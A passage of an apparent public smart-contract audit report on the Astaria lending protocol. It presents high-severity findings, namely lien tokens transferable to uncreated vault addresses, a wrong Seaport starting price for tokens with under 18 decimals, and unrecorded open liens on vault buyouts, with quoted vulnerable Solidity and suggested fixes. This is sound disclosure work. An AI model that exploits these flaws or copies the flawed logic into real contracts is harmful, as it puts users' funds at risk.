5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L360-L375\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L360-L375</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L835-L847\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L835-L847</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L731-L742\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L731-L742</a><br>\n<a href=\"https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed\">https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed</a></p>\n<h3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>In LienToken.transferFrom, require to.code.length >0, thus preventing the transfer of lien tokens to uncreated public vaults</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  function transferFrom(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    address from,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    address to,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint256 id</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) public override(ERC721, IERC721) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    LienStorage storage s = _loadLienStorageSlot();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    if (_isPublicVault(s, to)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      revert InvalidState(InvalidStates.PUBLIC_VAULT_RECIPIENT);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  require(to.code.length &gt; 0);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    if (s.lienMeta[id].atLiquidation) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      revert InvalidState(InvalidStates.COLLATERAL_AUCTION);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    delete s.lienMeta[id].payee;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    emit PayeeChanged(id, address(0));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    super.transferFrom(from, to, id);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/246#issuecomment-1401801777\">androolloyd (Astaria) commented</a>:</strong></p>\n<blockquote>\n<p>The mitigation seems like it now blocks transfers to eoas.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/246\">SantiagoGregory (Astaria) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/246#issuecomment-1436028951\">Picodes (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Indeed the mitigation may have unintended consequences.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-15-wrong-starting-price-when-listing-on-seaport-for-assets-that-has-less-than-18-decimals\" style=\"position:relative;\"><a href=\"#h-15-wrong-starting-price-when-listing-on-seaport-for-assets-that-has-less-than-18-decimals\" aria-label=\"h 15 wrong starting price when listing on seaport for assets that has less than 18 decimals permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/235\">[H-15] Wrong starting price when listing on Seaport for assets that has less than 18 decimals</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/235\">Koolex</a></em></p>\n<p>According to Astaria’s docs: <br><a href=\"https://docs.astaria.xyz/docs/protocol-mechanics/loanterms\">https://docs.astaria.xyz/docs/protocol-mechanics/loanterms</a></p>\n<blockquote>\n<p>Liquidation initial ask: Should the NFT go into liquidation, the initial price of the auction will be set to this value. Note that this set as a starting point for a dutch auction, and the price will decrease over the liquidation period. This figure is should also be specified in 10^18 format.</p>\n</blockquote>\n<p>The liquidation initial ask is specified in 18 decimals. This is then used as a starting price when the NFT goes under auction on OpenSea. However, if the asset has less than 18 decimals, then the starting price goes wrong to Seaport.</p>\n<p>This results in listing the NFT with too high price that makes it unlikely to be sold.</p>\n<h3 id=\"proof-of-concept-12\" style=\"position:relative;\"><a href=\"#proof-of-concept-12\" aria-label=\"proof of concept 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The starting price is set to the liquidation initial ask:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"sh\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    listedOrder = s.COLLATERAL_TOKEN.auctionVault(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ICollateralToken.AuctionVaultParams({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        settlementToken: stack[position].lien.token,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        collateralId: stack[position].lien.collateralId,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        maxDuration: auctionWindowMax,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        startingPrice: stack[0].lien.details.liquidationInitialAsk,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        endingPrice: 1_000 wei</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/AstariaRouter.sol#L639-L647\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/AstariaRouter.sol#L639-L647</a></p>\n<p>Let’s assume the asset is USDC which has 6 decimals:</p>\n<ol>\n<li>Strategist signs a strategy with liquidationInitialAsk <strong>1000e18</strong>.</li>\n<li>Following the docs, this means the starting price is supposed to be <strong>1000</strong> USDC</li>\n<li>The NFT is being liquidated</li>\n<li>1000e18 is passed to Seaport along with asset USDC</li>\n<li>Seaport lists the NFT, and the price will be too high as1000e18 will be <strong>1000000000000000</strong> USDC</li>\n</ol>\n<h3 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<ol>\n<li>Either fetch the asset’s decimals on-chain or add it as a part of the strategy.</li>\n<li>Convert liquidationInitialAsk to the asset’s decimals before passing it as a starting price.</li>\n</ol>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/235\">SantiagoGregory (Astaria) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-16-when-public-vault-a-buys-out-public-vault-bs-lien-tokens-it-does-not-increase-public-vault-as-liensopenforepoch-which-would-result-in-the-lien-tokens-not-being-repaid\" style=\"position:relative;\"><a href=\"#h-16-when-public-vault-a-buys-out-public-vault-bs-lien-tokens-it-does-not-increase-public-vault-as-liensopenforepoch-which-would-result-in-the-lien-tokens-not-being-repaid\" aria-label=\"h 16 when public vault a buys out public vault bs lien tokens it does not increase public vault as liensopenforepoch which would result in the lien tokens not being repaid permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/222\">[H-16] When Public Vault A buys out Public Vault B’s lien tokens, it does not increase Public Vault A’s liensOpenForEpoch, which would result in the lien tokens not being repaid</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/222\">cccz</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/476\">Jeiwan</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/303\">0xbepresent</a>, and <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/148\">chaduke</a></em></p>\n<p>Vault A can call buyoutLien to buy out Vault B’s lien tokens, which calls LienToken.buyoutLien</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">buyoutLien</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ILienToken.Stack[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">position</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    IAstariaRouter.Commitment </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">incomingTerms</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">whenNotPaused</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (ILienToken.Stack[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">, ILienToken.Stack </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">lienToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">buyoutLien</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ILienToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">LienActionBuyout</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">position:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">position</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">encumber:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ILienToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">LienActionEncumber</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">amount:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owed</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">receiver:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">recipient</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">lien:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ROUTER</span><span class=\"mtk1\">().</span><span class=\"mtk11\">validateCommitment</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">              </span><span class=\"mtk12\">commitment:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">incomingTerms</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">              </span><span class=\"mtk12\">timeToSecondEpochEnd:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_timeToSecondEndIfPublic</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">stack:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span></span></span></code></pre>\n<p>In LienToken.buyoutLien, it will burn Vault B’s lien token and mint a new lien token for Vault A</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_replaceStackAtPositionWithNewLien</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">LienStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ILienToken.Stack[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">position</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Stack</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newLien</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">oldLienId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (ILienToken.Stack[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newStack</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">newStack</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">newStack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">position</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">newLien</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">oldLienId</span><span class=\"mtk1\">);                        </span><span class=\"mtk3\">// @ audit: burn Vault B&#39;s lien token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienMeta</span><span class=\"mtk1\">[</span><span class=\"mtk12\">oldLienId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">newLienId</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lien</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Point</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">point</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">Point</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">lienId:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newLienId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">amount:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo88</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">last:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo40</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">end:</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">details</span><span class=\"mtk1\">.</span><span class=\"mtk12\">duration</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeCastTo40</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">newLienId</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// @ audit: mint a new lien token for Vault A</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">newLienId</span><span class=\"mtk1\">, </span><span class=\"mtk11\">Stack</span><span class=\"mtk1\">({</span><span class=\"mtk12\">lien:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lien</span><span class=\"mtk1\">, </span><span class=\"mtk12\">point:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">point</span><span class=\"mtk1\">}));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>And, when Vault B is a public vault, the handleBuyoutLien function of Vault B will be called to decrease liensOpenForEpoch.<br>\nHowever, when Vault A is a public vault, it does not increase the liensOpenForEpoch of Vault A.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">_isPublicVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payee</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">IPublicVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">payee</span><span class=\"mtk1\">).</span><span class=\"mtk11\">handleBuyoutLien</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IPublicVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">BuyoutLienParams</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">lienSlope:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">calculateSlope</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">encumber</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">position</span><span class=\"mtk1\">]),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">lienEnd:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">encumber</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">position</span><span class=\"mtk1\">].</span><span class=\"mtk12\">point</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">increaseYIntercept:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">buyout</span><span class=\"mtk1\"> -</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">encumber</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">position</span><span class=\"mtk1\">].</span><span class=\"mtk12\">point</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">handleBuyoutLien</span><span class=\"mtk1\">(</span><span class=\"mtk12\">BuyoutLienParams</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">onlyLienToken</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span 